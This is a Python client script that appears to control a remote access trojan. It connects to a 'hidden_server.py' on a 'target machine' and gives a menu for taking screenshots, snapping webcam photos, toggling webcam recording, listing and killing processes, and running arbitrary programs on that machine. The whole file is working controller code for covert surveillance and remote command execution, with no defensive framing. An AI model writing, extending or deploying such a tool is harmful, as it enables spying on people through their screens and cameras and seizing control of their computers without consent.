# client.py
# Simple client to connect to the hidden_server.py on port 12345.
# Sends commands remotely and prints responses.
# Run the server first on the target machine.

import socket
import json

def send_command(host='127.0.0.1', port=12345, command=None, **kwargs):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
        request = {"command": command, **kwargs}
        request_json = json.dumps(request)
        sock.send(request_json.encode('utf-8'))
        response_data = sock.recv(4096).decode('utf-8')
        response = json.loads(response_data)
        return response
    except socket.error as e:
        return {"status": "error", "messages": [f"Connection failed: {e}. Is the server running on {host}:{port}?"]}
    except json.JSONDecodeError as e:
        return {"status": "error", "messages": [f"Invalid response: {e}"]}
    except Exception as e:
        return {"status": "error", "messages": [f"Unexpected error: {e}"]}
    finally:
        sock.close()

if __name__ == "__main__":
    host = input("Enter server host (default 127.0.0.1): ").strip() or '127.0.0.1'
    while True:
        print("\n--- REMOTE CLIENT ---")
        print("1) Take screenshot")
        print("2) Typed capture (send text)")
        print("3) List processes")
        print("4) Close process (enter name)")
        print("5) Generate harmless files")
        print("6) Open program (enter cmd)")
        print("7) Take webcam photo")
        print("8) Toggle webcam recording")
        print("9) Exit")
        choice = input("Enter choice: ").strip()
        if choice == "9":
            break
        elif choice == "1":
            resp = send_command(host, command="take_screenshot")
        elif choice == "2":
            text = input("Text to send: ").strip()
            resp = send_command(host, command="typed_capture", text=text)
        elif choice == "3":
            limit_str = input("Limit (default 300): ").strip()
            limit = int(limit_str) if limit_str else 300
            resp = send_command(host, command="list_processes", limit=limit)
        elif choice == "4":
            name = input("Process name: ").strip()
            if not name:
                print("No name provided.")
                continue
            resp = send_command(host, command="close_process", name=name)
        elif choice == "5":
            resp = send_command(host, command="generate_harmless_files")
        elif choice == "6":
            cmd = input("Command/path: ").strip()
            if not cmd:
                print("No command provided.")
                continue
            resp = send_command(host, command="open_program", cmd=cmd)
        elif choice == "7":
            resp = send_command(host, command="take_webcam_photo")
        elif choice == "8":
            resp = send_command(host, command="toggle_webcam_recording")
        else:
            print("Unknown option.")
            continue
        status = resp.get("status", "unknown")
        messages = resp.get("messages", ["No response."])
        print(f"\n{'[OK]' if status == 'ok' else '[ERROR]'}:\n" + "\n".join(messages))